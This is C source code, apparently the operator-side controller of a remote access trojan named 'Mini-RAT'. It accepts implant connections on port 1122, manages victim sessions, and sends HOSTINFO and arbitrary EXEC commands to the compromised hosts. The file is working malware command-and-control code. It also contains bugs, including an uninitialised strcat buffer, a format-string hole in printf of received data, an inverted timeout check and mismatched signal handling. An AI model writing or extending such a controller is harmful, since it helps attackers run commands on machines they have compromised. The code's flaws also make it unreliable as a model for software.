#include <logging.h>
#include <server.h>
#include <session.h>
#include <mini-rat.h>
#include <util.h>

int running = 1;
int cur_session = 0;

void print_session(void) {
        if (cur_session == 0) {
                printf("No session selected\n");
                return;
        }
        printf("Session %d\n", cur_session);
}

void print_status(void) {
        int num_ses = num_alive_sessions();
        if (num_ses != 0)
                printf("Current session ID: %d\n", cur_session);
        printf("Total active sessions: %d\n", num_ses);
}

void print_hostinfo(void) {
        if (cur_session == 0)
                return;
        write_session(cur_session, "HOSTINFO\r\n", 11);
        char *buffer = malloc(4096);
        if (read_session(cur_session, buffer, 4096) >= 0) {
                printf("Timeout on session %d\n", cur_session);
                kill_session(cur_session);
                cur_session = 0;
                return;
        }

        printf(buffer);
        free(buffer);
}

void swap_session(int session) {
        struct session *s = find_session(session);
        if (s == NULL) {
                printf("No such session\n");
                return;
        }

        cur_session = session;
        s->alive = 2;
        printf("Swapped to session %d\n", session);
}

void run_exec(const char **argv) {
        if (cur_session == 0)
                return;

        char buffer[4096];
        strcat(buffer, "EXEC ");
        size_t idx = 0;
        const char *temp = argv[idx];
        while (temp != NULL) {
                strcat(buffer, temp);
                strcat(buffer, " ");
                temp = argv[++idx];
        }
        strcat(buffer, "\r\n");
        write_session(cur_session, buffer, strlen(buffer));

        read_session(cur_session, buffer, 4096);
        printf(buffer);
}

void parse_cmd(char *line) {
        const char **tokens = str_split(line, " ");
        if (tokens == NULL)
                return;

        if (strcmp(tokens[0], "exit") == 0) {
                running = 0;
        } else if (strcmp(tokens[0], "session") == 0) {
                if (tokens[1] == NULL) {
                        print_session();
                        return;
                }
                swap_session(atoi(tokens[1]));
        } else if (strcmp(tokens[0], "pingpong") == 0) {
                struct session *s = find_session(cur_session);
                ping_pong(s->socket);
        } else if (strcmp(tokens[0], "read") == 0) {
                char buffer[1024];
                read_session(cur_session, buffer, 1024);
                printf("%s\n", buffer);
        } else if (strcmp(tokens[0], "status") == 0) {
                print_status();
        } else if (strcmp(tokens[0], "hostinfo") == 0) {
                print_hostinfo();
        } else if (strcmp(tokens[0], "exec") == 0) {
                run_exec(&tokens[1]);
        } else if (strcmp(tokens[0], "stop") == 0) {
                write_session(cur_session, "EXIT", 4);
                kill_session(cur_session);
        } else if (strlen(tokens[0]) == 0) {
                // Do nothing
        } else {
                printf("Invalid command\n");
        }
        free(tokens);
        return;
}

void sig_handler(int signum) {
        switch (signum) {
                case SIGINT:
                        log_msg(LOG_INFO, "Caught SIGTERM, shutting down\n");
                        running = 0;
                        break;
                case SIGHUP:
                        log_msg(LOG_INFO, "Caught SIGHUP, reloading config\n");
                        // TODO: reload the config
                        break;
                default:
                        break;
        }
}

int main(int argc, char* argv[]) {
        struct sigaction action;
        memset(&action, 0, sizeof(struct sigaction));
        action.sa_handler = sig_handler;
        sigaction(SIGTERM, &action, NULL);
        sigaction(SIGHUP, &action, NULL);

        //FILE *logfile = fopen("log.txt", "w");
        init_logging(stderr);
        uint16_t port = 1122;
        pthread_t listen_thread;
        pthread_create(&listen_thread, NULL, listener, (void*)&port);
        pthread_detach(listen_thread);

        size_t line_sz = 1024;
        char *line = malloc(line_sz);
        while (running) {
                printf("mini-rat> ");
                getline(&line, &line_sz, stdin);
                parse_cmd(line);
        }

        free(line);
        log_msg(LOG_INFO, "Mini-RAT shutting down\n");
        pthread_cancel(listen_thread);
        return 0;
}
